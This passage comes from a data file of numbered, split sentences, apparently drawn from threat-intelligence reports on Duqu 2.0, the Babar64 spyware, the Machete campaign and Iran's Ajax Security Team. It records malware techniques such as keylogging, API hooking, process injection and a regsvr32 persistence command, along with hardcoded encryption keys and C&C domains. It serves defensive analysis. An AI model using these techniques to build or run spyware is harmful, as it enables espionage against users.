below .", "2996": "The format is designed to hold key - value pairs .", "2997": "The keys are always 4-byte long , and the values can be of arbitrary size .", "2998": "We believe that the keys are timestamps and the values are configuration entries , although the file format could hold any other similarly structured information ( e.g.", "2999": "configurations ) .", "3000": "The old file format begins with 4 bytes whose value is undefined .", "3001": "In the serialization process , it is read from an uninitialized buffer , and it is ignored in the deserialization process .", "3002": "The new file format does not have such a beginning byte sequence .", "3003": "The main part of the file format is surrounded by 4 signature bytes at the beginning and at the end .", "3004": "The byte sequence in the old Duqu file format is 0x839172FF , and in the new Duqu 2.0 version , it is 0x7749CB4D.", "3005": "In both cases , the next integer indicates the number of entries , followed by the entries themselves .", "3006": "Each entry begins with a 4-byte key , and then the value .", "3007": "In the new format , the value always begins with 13 bytes ( that can be logically divided into four 4 byte integers and a 1 byte value : 4 + 4 + 1 + 4 + 4 ) , but in the old format , this is missing .", "3008": "Furthermore , the value contains a variable size part in both formats .", "3009": "This is a length prefixed buffer that can hold arbitrary data .", "3010": "In essence , the only difference between the Duqu and the Duqu 2.0 config file formats is the presence of the undefined 4 bytes at the beginning of the file in the old version , and the presence of the 13 additional value bytes in the new version .", "3011": "The logging function itself is identical , and the data structure used for storing log entries is very similar .", "3012": "The Duqu version of the data structure has embedded function pointers , while the Duqu 2.0 version uses a virtual function table like structure .", "3013": "The main difference from a C++ virtual function table is that the pointer to the table is the last field of the associated structure instead of the first field ( see Figure 6 ) .", "3014": "In general , change in the coding style can be seen all over the code .", "3015": "While Duqu uses object oriented style that is similar , but not identical to what C++ compilers do , Duqu 2.0 moved mainly to \" real \" C++ , but there are still deviations from the standard C++ style ( like the previously function table ) .", "3016": "Both the Duqu and Duqu 2.0 avoids storing the messages logged through this function .", "3017": "In both codebase , a \" handle_log_entry \" function is called after creating the log entry structure , but this function throws the object away ( frees the memory ) and does not print or save it .", "3018": "The authors probably used C / C++ macros to avoid detailed logging in release builds , but in this case we still see the logging function invocation .", "3019": "In this case , the macro was probably placed in the function that should have printed the log message ( handle_log_entry ) , and since this is a virtual function , the compiler could not optimize out the function invocations directly .", "3020": "The logging function is called equal times in the Duqu and the Duqu 2.0 samples , and the invocation is always very similar ( see Figure 7 ) .", "3021": "The arguments are usually not strings describing the event directly , but 4 byte magic numbers .", "3022": "The logging function is invoked equal times , and the magic numbers are almost always identical in Duqu and Duqu 2.0 .", "3023": "The network communication methods used by Duqu 2.0 are described in the following list .", "3024": "SocketServer1 .", "3025": "In export function nr1 , if in the config the \" startSockServer \" parameter is set , it will start a server accordingly SocketServer2 .", "3026": "Binds between ports 17000 and 17100 , can be configured to be client or server GifServer .", "3027": "With Custom HTTP Server implementation , possibly based on SocketServer2 PipeComm .", "3028": "PIPE or IPC communication , customizable network communication HttpClient .", "3029": "WinHTTP - based , simple client , uses \" COUNTRY= \" in cookie parameters , ( standard HTTP client ) Duqu has used a very unique user agent string when communicating over HTTP .", "3030": "Mozilla/5.0 ( Windows ; U ; Windows NT 6.0 ; en - US ; rv:1.9.2.9 ) In contrast , Duqu 2.0 chooses user agent string randomly from a large set of often used values listed in Sample 7 .", "3031": "The following list shows the browser agent strings found in Duqu 2.0 .", "3032": "Duqu 2.0 uses more than one method to import functions from DLLs .", "3033": "One of the methods utilizes a hash method to represent function names as 4 byte integers .", "3034": "It iterates through all importable function and finds the one whose function name hash matches the given hash .", "3035": "This hash function uses a magic number .", "3036": "A very similar import method and hash function is used in Duqu and Duqu 2.0 although the magic numbers are different : 0x86F186F1 and 0xB31FB31F.", "3037": "Note that even the inner structure of the magic numbers are similar ( 2x2 bytes ) .", "3038": "For HTTPS , a self signed certificate is created by the malware itself .", "3039": "( Most likely by contacting gpl3.selfsigned.org ) .", "3040": "The Common Name ( CN ) field seems to be \" * \" in the created certificate .", "3041": "During data transfer , the malware uses < 5 random numbers>.gif for file name and a 843-byte GIF file + additional random bytes .", "3042": "The transmissions may be protected by AES .", "3043": "One possible way to detect such transmission ( if cleartext traffic is somehow available ) to detect the actual 843-byte GIF file .", "3044": "For the known two samples , this GIF portion was identical .", "3045": "The actual image in hex dump is the following .", "3046": "The image itself is a small picture , basic color is yellow and there are some orange dots in it .", "3047": "For the main binary of the malware , we propose the following rules for detection .", "3048": "We 've made an initial analysis to prove our claims that there is a strong connection between Duqu and Duqu 2.0 malwares .", "3049": "Our main goal was to highlight the most striking similarities and differences between the samples .", "3050": "Similarities shows that the developers of Duqu 2.0 have reused the code basis of the old Duqu specimens and the differences found in the binaries indicates that the developers of Duqu have modified their tools to avoid detections .", "3051": "The corresponding author is Dr.", "3052": "Boldizs r Bencs th bencsath@crysys.hu Laboratory of Cryptography and System Security CrySyS \u2013 http://www.crysys.hu/ Budapest University of Technology and Economics Department of Telecommunications 1117 Magyar Tud sok Krt .", "3053": "2 .", "3054": "Budapest , Hungary GPG BENCSATH Boldizsar < boldi@crysys.hu > Key ID 0x64CF6EFB Fingerprint 286C A586 6311 36B3 2F94 B905 AFB7 C688 64CF 6EFB", "3055": "DROPPER MD5 9fff114f15b86896d8d4978c0ad2813d SHA-1 27a0a98053f3eed82a51cdefbdfec7bb948e1f36 File Size 693.4 KB ( 710075 bytes ) Compile Time 2011 - 08 - 29 11:48:42 IMPLANT MD5 4525141d9e6e7b5a7f4e8c3db3f0c24c SHA-1 efbe18eb8a66e4b6289a5c53f22254f76e3a29bd File Size 585.4 KB ( 599438 bytes ) Compile Time 2011 - 08 - 29 13:02:29 Special thanks for their contribution in the making of this report go to Morgan Marquis - Boire , Joan Calvet , Paul Rascagn res , Alex Dulaunoy , Raphael Vinot and the remaining team of CIRCL Luxembourg .", "3056": "You guys rock \\m/ Comments or inquiries please direct to Marion Marschalek ( 0xF372F2CA ) .", "3057": "Babar and the related crowd of animalesque malware will be presented at SyScan'15 conference ( https://www.syscan.org/ ) in March 2015 .", "3058": "No elephants were harmed in the making of this report .", "3059": "This work is licensed under a Creative Commons Attribution - NonCommercial - ShareAlike 4.0 International License .", "3060": "Subject of this analysis is a fascinating piece of malware , which invades Windows desktop machines and aims at ..", "3061": "well , all the things .", "3062": "A fully blown espionage kit , so to say , sophisticated almost .", "3063": "More interesting than the malware itself though is the path to the associated symbol file , which appears embedded in the dropper .", "3064": "The analyzed malware samples come with the internal project name ' Babar64 ' .", "3065": "The myth of Babar has been around for a while in the intelligence community .", "3066": "Questions have been raised since Le Monde published an article on Babar in 2014 [ 1 ] and were recently fuelled by a leaked government presentation found among a stash of documents published in January by Spiegel [ 2 ] .", "3067": "The leaked document was authored by the Communications Security Establishment Canada ( CSEC ) and reports about a potential nation state attack involving malware named Babar .", "3068": "The actor behind the attacks is assumed to be French inteligence .", "3069": "Assumptions are based on certain binary attributes , language and location of infrastructure as well as targets .", "3070": "The binaries at hand fit well with the description CSEC provides , although it is quite clear they are a newer version from what CSEC had uncovered around 2009 .", "3071": "It is not clear whether the compilation timestamps are falsified , but an earlier compilation time than the actual stamp seems unlikely .", "3072": "Doubtlessly though , the Babar binaries match with a malware strain representing itself as Bunny , as well as a family dubbed NBOT or TFC .", "3073": "The DLL name is random but legitimately looking and hardcoded for a specific dropper .", "3074": "It is also stored as encrypted string in the binary , and has been seen to decrypt to either ' perf585.dll ' or ' dump21cb.dll ' depending on the dropper .", "3075": "The encryption algorithm used is AES ( Advanced Encryption Standard ) with 128-bit keys .", "3076": "The keys used for decryption are ' 20 33 AF 73 A9 AC 72 D3 BE E6 A5 73 92 BA 37 6C ' for the implant filename and ' A0 0E 3E B3 3A 1C D3 AA A0 BE 3F B3 F9 0A 96 15 ' for decrypting the binary .", "3077": "AES is the encryption algorithm of choice throughout the dropper and its implant 's operations .", "3078": "Interestingly , the Babar dropper as well as the implant show a similar method of API name obfuscation as the Bunny malware and samples from the NBOT family .", "3079": "Dedicated APIs are loaded through a resolution function , which searches for library exports by comparing hashes of the export names with a given hash .", "3080": "For the Babar project though the attackers used an adapted version of SHA-1 , as opposed to the simple XOR / ROL hash algorithm which was used in the Bunny project .", "3081": "Curiously though , the regsvr32.exe process used to load the dropped implant remains running .", "3082": "This way Babar leaves a visible process on the process list during execution .", "3083": "As the project name ' Babar64 ' suggests , dropper and implant are designed to work on 32-bit and on 64-bit Windows versions .", "3084": "However , process hooking and injection can only affect 32-bit processes due to the bitness of the implant itself .", "3085": "Babar is a fully blown espionage tool , built to excessively spy on the user 's activity on an infected machine .", "3086": "The DLL dropped by Babar is placed into the application data folder , along with a directory named ' MSI ' where the runtime data will be stored .", "3087": "This is achieved by loading the Babar DLL to remote processes through a mapped memory object .", "3088": "Babar 's anti - analysis measures are sparse .", "3089": "It is not protected by a runtime packer or crypter , it does not have sandbox detection or anti - debugging measures , most character strings are shown in clear - text .", "3090": "Babar does show the same obscure treatment for installed anti - virus products as the Bunny malware though .", "3091": "Babar also enumerates the Windows Management Instrumentation for installed AV solutions , while the exact use of this information is not yet known .", "3092": "We do suspect large portions of the product enumeration to be based on the exact same source code as the module Bunny used .", "3093": "The enumeration function issues the commands \u201e SELECT * FROM AntiVirusProduct \" and retrieves attributes such as ' productState ' , ' DisplayName ' , ' VersionNumber ' and ' productUptoDate ' .", "3094": "The anti - virus solutions searched for are again identified by 256-bit SHA hashes .", "3095": "Only some of the hashes could be mapped to known names of anti - virus solutions .", "3096": "Selected APIs are identified by hashes , which are used to load the APIs dynamically at runtime .", "3097": "The hashes are hardcoded within the binary , and will be compared to hashed library exports by the API resolution routine .", "3098": "The hashing algorithm is different from the simple XOR / ROL technique Bunny uses .", "3099": "It seems to be based on SHA-1 , but generates 32-bit hashes instead of the standard 160-bit length .", "3100": "What Bunny , Babar and NBOT all have in common though is that the obfuscation technique is easy to break and only applied to a subset of APIs .", "3101": "As an anti - analysis trick this is considerably useless , it does make sense though to trick malware detection solutions which apply heuristics based on static analysis of API calls .", "3102": "This becomes evident when looking at the list of Babar 's obfuscated API names , which includes RegisterRawInputDevices , GetRawInputData , GetClipboardData or DirectSoundCaptureCreate .", "3103": "The key is named ' MSSecurity ' and executes the exact same command line as the infector , every time the system boots - ' \" regsvr32.exe \" /s /n /i \" % APPDATA%\\%DLLNAME% \" ' .", "3104": "Interesting again , same as during infection , the regsvr32.exe process remains running even after Babar is readily set up .", "3105": "During initialization Babar loads and decrypts a set of configuration parameters which are appended to the DLL 's relocation section .", "3106": "ASCII strings within the configuration data reveal a lot about Babar 's intentions .", "3107": "As could be seen already in binaries of related families , next to the hardcoded configuration data Babar maintains a system specific runtime configuration .", "3108": "The additional configuration consists of a set of local attributes and a set of values derived from the Windows environment .", "3109": "The attributes are dynamically generated or requested at runtime and not stored in memory .", "3110": "Values retrieved from Windows environment .", "3111": "The DLL when loaded in the context of an application seeks to invade a maximum of two more victim processes .", "3112": "This for once is a resilience measure , so if the initially infected process stops running the malware remains in memory through additional instances .", "3113": "On the other hand it is practically a load balancing measure .", "3114": "The C&C communication module is located in an export of the DLL , which will be executed through a remote thread , injected like the child processes , via a memory - mapped file .", "3115": "The process infection is achieved by mapping a shared object into the victim 's process space and invoking a function stub as remote thread .", "3116": "The steps being taken are .", "3117": "The mapped object contains name and path to the malicious DLL , the name of the pipe being used for communication between the instances , the name of the export from the DLL to be called as well as information about instances already running .", "3118": "For picking a process to infect the malware randomly picks one from a list of prospects .", "3119": "These have to be 32-bit processes , not already infected and not among a list of processes to avoid such as winlogon.exe , explorer.exe , cmd.exe or regsvr32.exe .", "3120": "This way Babar always keeps three instances in memory .", "3121": "The first one to start up will be the ' main instance ' .", "3122": "If any of the instances dies , a new third instance will be created .", "3123": "If the main instance dies the oldest child will take over .", "3124": "The main instance generates a random GUID which is used as name and passed to child instances .", "3125": "These pipes represent the server side for child instances , and also the point to connect to for hooks Babar installs to spy on several system APIs .", "3126": "A summary of the capabilities would be as follows .", "3127": "The keylogger is based on the raw input model .", "3128": "By processing the window message queue it filters out input events and dispatches them to a raw input device object .", "3129": "Said object is configured to grab keyboard events through GetRawInputData .", "3130": "The file is located in Babar 's working directory and named update.msi .", "3131": "The design of the keylogging component is simple but effective .", "3132": "Interesting though , the code seen in Babar 's implant is remarkably similar to an example posted at [ 4 ] .", "3133": "A global hook is installed by calling SetWindowsHookEx by passing the thread ID zero .", "3134": "It applies to all processes running in the same desktop , having the same ' bitness ' as the DLL to be injected .", "3135": "In the given case this applies to all 32-bit processes .", "3136": "This effectively means code provided by the hooking DLL gets executed whenever an arbitrary desktop process receives an event of a type specified by the hook .", "3137": "Babar installs hooks for type 2 and 3 , which are WH_KEYBOARD and WH_GETMESSAGE .", "3138": "This way Babar has control over all keyboard and message events received by any application on the same Windows desktop .", "3139": "Through the hook mechanism Babar can be maximum invasive in the Windows userland .", "3140": "This is achieved by applying the detours technique , which implements trampoline functions to be invoked every time a hooked API is called [ 6 ] .", "3141": "To achieve this , Babar rewrites the in - memory code for target APIs .", "3142": "A call to a hooked API then results in the calling application invoking a trampoline function , which performs malicious activity and then passes control on to the legitimate API .", "3143": "Babar supports trampoline functions for a limited list of APIs and limited to a set of processes of interest , defined by its configuration .", "3144": "The list of APIs to hook is parted in three groups .", "3145": "Any set of hooks will only be applied to a defined set of processes .", "3146": "The predefined groups of application names retrieved from the hardcoded configuration data set the scope of Babar 's hooking advances .", "3147": "The parsing function for intercepted internet communication searches for chat traffic , more specifically for messages conforming with the MSNP21 standard .", "3148": "Babar is searching for tags such as ' Message- Type ' , ' Reliability ' , ' To ' , ' From ' or ' Text ' to pick out of the stream .", "3149": "A more detailed explanation concerning the MSNP21 can be found at [ 7 ] .", "3150": "MSNP21 is the MSN messenger chat protocol that was introduced with Windows Live 2010 beta .", "3151": "It is unclear though as of why only parsing for the MSN messenger is supported .", "3152": "AMR enables the malware to encode and decode raw audio frames as they are passed to or grabbed from the audio devices .", "3153": "The very same malware module performs screen captures while dumping the snooped data .", "3154": "This is assumed to happen to recognize the parties involved in the conversation by capturing the GUI of the softphone application .", "3155": "Babar comes with the Deflate algorithm , as used by Zlib , to be able to compress data before encrypting it and dumping it to disk .", "3156": "The data is encrypted with 128-bit AES using the key 24 FE C5 AD 34 56 F7 F8 12 01 00 AE B6 7C DE AB for reading and writing files .", "3157": "The following files have been seen to be dumped to Babar 's working directory under % APPDATA%\\MSI .", "3158": "Stolen information will be handled by the Babar main instance , which receives data through six named pipes from other instances or hooked processes .", "3159": "The update.msi-file stores data collected by the keylogging module .", "3160": "It posesses a file header which among other attributes keeps system specific data .", "3161": "This is assumed to serve for mapping of logfiles to infected hosts .", "3162": "Log lines written for stolen data from browsers and the MSN messenger are built by the format string \" % s%c%s|%s\\n \" , where the first string is likely participant1 of a conversation , the second string participant2 .", "3163": "Both are parted by the characters ' < ' or ' > ' depending on the direction of the conversation .", "3164": "Similar log lines accompany dumped sound data and saved documents .", "3165": "Sound data logs follow the format \" A|%u|%S \" , document logs the format \" % I64i|%I64i|%I64i|%s%s|%s\\n \" .", "3166": "For documents three timestamps are included as well as whether read or write access was requested , indicated by ' R ' or ' W ' or ' - ' .", "3167": "The last placeholder is reserved for the filename .", "3168": "At the time of writing the content of the sound data log line remains unclear .", "3169": "The internet communication module of Babar is located in a sparate export called ' FindCtxSectionStringW ' , which will be invoked through remote thread injection at runtime .", "3170": "Injection is achieved the same way as the infection of child instances described in section 3.4 .", "3171": "It remains unclear though whether the C&Cs also served to instruct the infected machines per commands , as Babar does not posess obvious command parsing functionality .", "3172": "Data exfiltration is assumed to be time triggered .", "3173": "The domain horizons-tourisme.com is a legitimate website , operated by an Algerian travel agency , located in Algiers , Algeria .", "3174": "The website is in French and still online today .", "3175": "Gezelimmi.com is a Turkish domain , currently responding with an HTTP error message 403 , access not permitted .", "3176": "Both domains appear to be of legitimate use , but compromised and abused to host Babar 's server side infrastructure .", "3177": "At the time of writing the server pointed to by horizons-tourisme.com is still hosting left overs from the C&C infrastructure used by Babar .", "3178": "With directory traversal activated researchers from ESET could pull a minimalistic directory structure , showing directories named as follows .", "3179": "page | 14 Obviously , the directory belonging to Babar is ' bb28 ' .", "3180": "' tfc422 ' matches with strings found in the TFC bots ( previously named NBOT ) .", "3181": "The purpose of the ' d13 ' directory remains unknown , although it is assumed to serve for requests of a third currently unknown family .", "3182": "Most of the directories pulled from horizons-tourisme.com are empty , or contain empty files .", "3183": "The only script inside the bb28 directory though appears to be interesting .", "3184": "Its a .php - script named config.inc , containing variables which look familiar from Babar 's config such as ' user ' , ' i d ' or ' seq ' , but also a handful of comments from the authors .", "3185": "At the time of writing two Babar64 droppers are known , dropping one implant each .", "3186": "They both show traits of the malware described by CSEC , being attributed to French intelligence with \u201e moderate certainty \" [ 2 ] .", "3187": "The CSEC document mentions uncovering the attack in 2009 .", "3188": "The compilation timestamps of the binaries date back to August 2011 .", "3189": "While these can be faked it is still unlikely that the authors would change the 2009-timestamp to a future date .", "3190": "This , and the mentioning of ' Babar ' instead of ' Babar64 ' by CSEC indicates that the samples at hand stem from a more recent campaign .", "3191": "Besides the project name , Babar64 also shares the malformed user agent string described in the document , where a letter from the MSIE 6.0 name is missing .", "3192": "The second Babar64 binary comes with its own set of C&C servers .", "3193": "The first one is the legitimate website of AlexPetro Technical Services , a company operating in the oil and gas industry in Kairo , Egypt .", "3194": "The second domain is Iranian , allegedly owned by a web design company named Radcom .", "3195": "What links Babar64 to other families analyzed beforehand , such as Bunny or TFC ( also called NBOT ) are shared portions of source code and re - used coding techniques .", "3196": "The enumeration of anti - virus software and the code to query the system 's proxy settings are almost identical .", "3197": "Furthermore , the samples at hand show the same partial API name obfuscation as Bunny and TFC .", "3198": "What has changed is the hashing algorithm .", "3199": "Also common among all of the families seems to be to hold system specific configuration data in memory at runtime , although this holds true for a lot of malware .", "3200": "Putting Babar , Bunny and TFC in context a number of conclusion can be drawn .", "3201": "Looking at the compilation timestamps and assuming they are not faked ( which is backed by VirusTotal submission dates ) , the oldest family is TFC being active throughout 2010 .", "3202": "These are DDoS bots , used to build a botnet which can be utilized to attack adversaries on the internet .", "3203": "Next on the timeline is Babar64 , allegedly compiled middle of 2011 and first seen on VirusTotal middle of 2012 .", "3204": "It is believed that this strain has been active from 2011 until 2013 , spying on dedicated targets rather than being spread widely .", "3205": "Last comes Bunny , compiled second half of 2011 and making its first public appearance during the analysis of the Adobe Reader exploit for CVE-2011 - 4369 [ 9 ] .", "3206": "At the time when Bunny was spread through CVE-2011 - 4369 , before December 2011 , the vulnerability was unknown to the public .", "3207": "Bunny itself is a Lua script execution platform , not including any spying capabilities .", "3208": "All three families leave the impression of being developed by a team of skilled software developers , rather than being the product of a malware author operating in the criminal underground .", "3209": "Also none of the binaries makes attempts of hiding its intentions , which is a common trait among targeted malware .", "3210": "Heavy obfuscation or the use of crypters easily raises suspicion of heuristics based malware scanners .", "3211": "However , besides the CSEC document there was no obvious pointer found leading to the conclusion that Babar and its companions were set out by French inteligence services .", "3212": "As it is with digital crime , chances are high no proof will ever evolve and research will be limited to educated conclusions .", "3213": "The drawing of personal educated conclusions is left as an exercise for the interested reader .", "3214": "Lists of passive DNS entries for horizons-tourisme.com and gezelimmi.com can be found below .", "3215": "For gezelimmi.com .", "3216": "For horizons-tourisme.com .", "3217": "Resolve Location Network First Last 192.185.113.148 US 192.185.64.0/18 28.04.11 00:00 10.02.15 00:00 184.172.143.188 US 184.172.128.0/18 23.12.06 00:00 28.04.11 00:00 212.27.35.109 FR 212.27.32.0/19 02.08.05 00:00 23.12.06 00:00 206.41.94.190 CA 206.41.94.0/24 24.06.05 00:00 02.08.05 00:00", "3218": "Some time ago , a Kaspersky Lab customer in Latin America contacted us to say he had visited China and suspected his machine was infected with an unknown , undetected malware .", "3219": "While assisting the customer , we found a very interesting file in the system that is completely unrelated to China and contained no Chinese coding traces .", "3220": "At first look , it pretends to be a Java related application but after a quick analysis , it was obvious this was something more than just a simple Java file .", "3221": "It was a targeted attack we are calling \" Machete \" .", "3222": "\" Machete \" is a targeted attack campaign with Spanish speaking roots .", "3223": "We believe this campaign started in 2010 and was renewed with an improved infrastructure in 2012 .", "3224": "The operation may be still \" active \" .", "3225": "Most of the victims are located in , Venezuela , Ecuador , Colombia , Peru , Russia , Cuba , and Spain , among others .", "3226": "In some cases , such as Russia , the target appears to be an embassy from one of the countries of this list .", "3227": "Targets include high - level profiles , including intelligence services , military , embassies and government institutions .", "3228": "We have found no evidence of of exploits targeting zero - day vulnerabilities .", "3229": "Both the attackers and the victims appear to be Spanish - speaking .", "3230": "These files display a PowerPoint presentation that installs the malware on the target system once the file is opened .", "3231": "These are the names of the PowerPoint attachments .", "3232": "These files are in reality Nullsoft Installer self - extracting archives and have compilation dates going back to 2008 .", "3233": "A consequence of the embedded Python code inside the executables is that these installers include all the necessary Python libraries as well as the PowerPoint file shown to the victim during the installation .", "3234": "The result is extremely large files , over 3 MB .", "3235": "Here are some screnshots of the mentioned files .", "3236": "A technical relevant fact about this campaign is the use of Python embedded into Windows executables of the malware .", "3237": "This is very unusual and does not have any advantage for the attackers except ease of coding .", "3238": "There is no multi - platform support as the code is heavily Windows - oriented ( use of libraries ) .", "3239": "However , we discovered several clues that the attackers prepared the infrastructure for Mac OS X and Unix victims as well .", "3240": "In addition to Windows components , we also found a mobile ( Android ) component .", "3241": "Both attackers and victims speak Spanish natively , as we see it consistently in the source code of the client side and in the Python code .", "3242": "The following code snippets were found into the HTML of websites used to infect victims .", "3243": "Note : Thanks to Tyler Hudak from Korelogic who noticed that the above HTML is copy pasted from SET , The Social Engineering Toolkit .", "3244": "Also the following link to one known infection artifact .", "3245": "hxxp://name.domain.org / nickname / set / Signed_Update.jar The following are domains found during the infection campaign .", "3246": "Any communication with them must be considered extremely suspicious Creates the file Java Update.lnk pointing to appdata / Jre6/java.exe Malware is installed in appdata/ MicroDes/ Running processes Creates Task Microsoft_up The first evidence is the language used , both for the victims and attackers , is Spanish .", "3247": "The victims are all Spanish speaking according to the filenames of the stolen documents .", "3248": "The language is also Spanish for the operators of the campaign , we can find all the server side code written in this language : reportes , ingresar , peso , etc .", "3249": "The \" Machete \" discovery shows there are many regional players in the world of targeted attacks .", "3250": "Unfortunately , such attacks became a part of the cyber arsenal of many nations located over the world .", "3251": "We can be sure there are other parallel targeted attacks running now in Latin America and other regions .", "3252": "Kaspersky Lab products detect malicious samples related to this targeted attack as Trojan- Spy . Python . Ragua .", "3253": "Note : A full analysis of the Machete attacks is available to the Kaspersky Intelligent Services customers .", "3254": "Contact : intelreports@kaspersky.com", "3255": "We believe we 're seeing an evolution and development in Iranian-based cyber activity .", "3256": "In this report , we document the activities of the Ajax Security Team , a hacking group believed to be operating from Iran .", "3257": "Members of this group have accounts on popular Iranian hacker forums such as ashiyane [ .", "3258": "] org and shabgard [ .", "3259": "] org , and they have engaged in website defacements under the group name '' AjaxTM '' since 2010 .", "3260": "By 2014 , the Ajax Security Team had transitioned from performing defacements ( their last defacement was in December 2013 ) to malware-based espionage , using a methodology consistent with other advanced persistent threat actors in this region .", "3261": "It is unclear if the Ajax Security Team operates in isolation or if they are a part of a larger coordinated effort .", "3262": "The Ajax Security Team itself uses malware tools that do not appear to be publicly available .", "3263": "Although we have not observed the use of exploits as a means to infect victims , members of the Ajax Security Team have previously used publicly available exploit code in web site defacement operations .", "3264": "In sum , FireEye has recently observed the Ajax Security Team conducting multiple cyber espionage operations against companies in the defense industrial base ( DIB ) within the Unites States , as well as targeting local Iranian users of anti-censorship technologies that bypass Iran 's Internet filtering system .", "3265": "The transition from patriotic hacking to cyber espionage is not an uncommon phenomenon .", "3266": "It typically follows an increasing politicization within the hacking community , particularly around geopolitical events .", "3267": "This is followed by increasing links between the hacking community and the state , particularly military and/or intelligence organizations .", "3268": "In the late 1990 's and early 2000 's , a similar transition occurred within the Chinese hacking community .", "3269": "Around this time a significant shift in philosophy began to take place .", "3270": "Members of the Chinese hacking community that participated in such attacks soon found that transitioning to cyber espionage was more rewarding-both in terms of developing a more advanced skill set as well as in monetary remuneration .", "3271": "One group known as NCPH ( Network Crack Program Hacker ) , whose founding member '' Wicked/Withered Rose '' was a patriotic hacker , made the transition to cyber espionage by founding a '' hacker-for-hire '' group that simultaneously developed an association with the Chinese military .", "3272": "The group began developing zero-day exploits , rootkits and remote access tools ( RATs ) -using them in attacks against a variety of targets including the U.S. Department of Defense .", "3273": "( One of this group 's associates , '' whg '' , is still active and is believed to have developed one variant of the PlugX/SOGU malware .", "3274": ") The rationale behind this transition within the Chinese hacking community is nicely summed up in a message by the '' Honker Union of China '' to its members in 2010 : What benefit can hacking a Web page bring our country and the people ? It is only a form of emotional catharsis , please do not launch any pointless attacks , the real attack is to fatally damage their network or gain access to their sensitive information .", "3275": "In Iran , the hacking community appears to be undergoing a similar transformation .", "3276": "While a variety of Iranian hacker groups had engaged in politically motivated website defacements , the emergence of the '' Iranian Cyber Army '' in 2009 demonstrated '' a concentrated effort to promote the Iranian government 's political narrative online '' .", "3277": "They targeted , among others , news organizations , opposition websites and social media .", "3278": "This marked the beginning of a large- scale cyber offensive against the perceived enemies of the Iranian government .", "3279": "Foreign news and opposition websites are routinely blocked in Iran , as are the tools that allow users in Iran to bypass these restrictions .", "3280": "One of the key stakeholders in Iran 's Internet censorship program is the Iranian Revolutionary Guard Corps ( IRGC ) , under which the Basij paramilitary organization operates .", "3281": "The Basij formed the Basij Cyber Council and actively recruits hackers in order to develop both defensive and offensive cyber capabilities .", "3282": "There is increasing evidence to suggest that the hacker community in Iran is engaged in a transition from politically motivated defacements and denial of service attacks to cyber espionage activities .", "3283": "This model is consistent with the Basij 's recruitment of paramilitary volunteer hackers to '' engage in less complex hacking or infiltration operations '' leaving the more technical operations to entities over which they have increasingly direct control .", "3284": "As such , the capabilities of threat actors operating from Iran have traditionally been considered limited .", "3285": "And unsurprisingly , Iran has reportedly increased its efforts to improve offensive capabilities after being targeted by Stuxnet and Flame .", "3286": "All Internet Service Providers ( ISPs ) in Iran are required to implement filtering technology that censors access to content which the Iranian government deems unacceptable .", "3287": "This content includes categories such as pornography and political opposition .", "3288": "In response to these restrictions , Iranians have been increasingly using software that bypasses such filtering technology .", "3289": "To counter anti-censorship efforts , Iran has attempted to block the use of certain software tools .", "3290": "We have observed the Ajax Security Team use a malware family that they identify simply as 'Stealer ' .", "3291": "This DLL is written in Delphi .", "3292": "State is maintained between the stealer component IntelRS.exe and the FTP component AppTransferWiz.DLL using a file from the FTP server '' sqlite3.dll '' , as well as a global atom '' SQLiteFinish '' .", "3293": "IntelRS.exe waits in an indefinite loop , until AppTransferWiz.DLL defines this state .", "3294": "The filenames for these encrypted files follow this naming scheme : The { stolen data type } parameter indicates where the data was harvested from ( e.g. , a Web browser , an instant messenger application , installed proxy software ) .", "3295": "It uses a key size of 256 bytes and block size of 128 bytes , which conforms to the FIPS-197 specification of AES-256 .", "3296": "It utilizes the passphrase 'HavijeBaba' and a salt of 'salam ! * % # ' as an input to PBKDF2 ( Password-Based Key Derivation Function 2 ) to derive the key and initialization vector for the encryption .", "3297": "This key derivation implementation in .NET", "3298": "is done using the Rfc2898DeriveBytes class .", "3299": "The passphrase and salt are Persian language words .", "3300": "'' Havij '' means '' carrot '' , '' Baba '' means '' father '' , and '' Salam '' is a common greeting that means '' Peace '' .", "3301": "We identified 17 droppers during this research , including : The 2009 compile time appears to have been forged , while the 2013 compile times may be legitimate .", "3302": "In some cases , we found an implant but not the parent dropper .", "3303": "In total , 22 of the 23 implants that we identified during our research had unique compile times ranging from 2013-10-29 until 2014-03-15 .", "3304": "We identified two implants that were both compiled on 2014-3-15 at 23:16 .", "3305": "These compile times appear to be legitimate and coincide with attempted intrusion activity attributed to these attackers .", "3306": "Analysis of the PDB strings seen in the implants indicates that there may be more than one developer working on the source code for the Stealer builder .", "3307": "The following two PDB paths were seen in the collection of implants that we collected : These strings indicate that the Stealer source code was stored in two different paths but not necessarily on two different computers .", "3308": "The f : \\ Projects\\ path may be from an external storage device such as a thumb drive .", "3309": "It is therefore possible that only one person has access to the source code , but keeps a separate repository on an external storage device .", "3310": "Alternatively , the different file paths could be the result of two different actors storing their source code in two different locations .", "3311": "In nine of the implants that we collected , we found a consistent portable executable ( PE ) resource with a SHA256 of 5156aca994ecfcb40458ead8c830cd66469d5f5 a031392898d323a8d7a7f23d3 .", "3312": "This PE resource contains the VSVERSIONINFO .", "3313": "In layman 's terms , this can best be described as the metadata describing the executable file .", "3314": "This specific PE resource contained the following information : Note the InternalName of 'Stealer.exe ' .", "3315": "This is the attackers ' name for this malware family .", "3316": "During our research , we recovered two different tools used by the members of the Ajax Security Team in conjunction with targeted intrusion activities .", "3317": "The first tool , labeled the 'Stealer Builder ' was compiled on 2014-04-08 .", "3318": "This compile date may indicate that the group is still active .", "3319": "We also noted that the Builder did not allow the attacker to select a new passphrase or salt used to encrypt the stolen data .", "3320": "The passphrase 'HavijeBaba ' and a salt of 'salam ! * % # ' are both hardcoded into the builder .", "3321": "During testing , we observed that backdoors generated by this Stealer Builder had a timestamp of 2013-12-19 .", "3322": "We had one backdoor in our repository with this same timestamp .", "3323": "The VSVERSIONINFO PE resource mentioned above ( SHA256 5156aca994ecfcb40458ead8c830cd66469d5f5 a031392898d323a8d7a7f23d3 ) is an artifact of the Stealer builder that we recovered .", "3324": "The builder generates an executable named IntelRapidStart .", "3325": "exe .", "3326": "This executable contains the aforementioned VSVERSIONINFO PE resource .", "3327": "We also recovered a tool designed to encode plaintext into Base64 encoded text or decode Base64 encoded text into plaintext .", "3328": "Members of the Ajax Security Team likely this use tool to encode the configuration data seen in RapidStartTech.stl files .", "3329": "As noted above , the RapidStartTech.stl contains the backdoor 's FTP credentials , implant name , decoy name , and screenshot interval , along with boolean settings for startup , keylogger , and screenshot plugins .", "3330": "Encoding and decoding Base64 data is a straightforward task and the standard Linux operating system offers a number of command line tools to achieve this task .", "3331": "The presence of a Windows-based GUI tool that simplifies encoding and decoding Base64 data indicates that these 